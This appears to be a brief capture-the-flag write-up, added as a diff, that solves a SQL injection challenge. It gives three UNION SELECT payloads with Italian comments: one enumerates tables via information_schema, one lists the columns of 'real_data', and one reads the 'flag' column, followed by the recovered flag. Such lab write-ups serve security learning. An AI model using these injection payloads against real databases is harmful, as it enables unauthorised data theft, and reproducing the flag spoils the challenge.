@@ -1,0 +1,16 @@
+Query 1: 1' UNION SELECT table_name, 2, 3, 4, 5, 6 from information_schema.tables WHERE '1'='1
+
+Scopriamo le tabelle contenute nel database.
+
+
+Query 2: 1' UNION SELECT column_name, 2, 3, 4, 5, 6 from information_schema.columns WHERE table_name = 'real_data' AND '1'='1
+
+Scopriamo le colonne contenute nella tabella "real_data".
+
+
+Query 3: 1' UNION SELECT flag, 2, 3, 4, 5, 6 from real_data WHERE '1'='1
+
+Leggiamo i dati dalla sezione di dati chiamata "flag".
+
+
+Flag = flag{Uni0ns_4re_so_tr1vi4l}
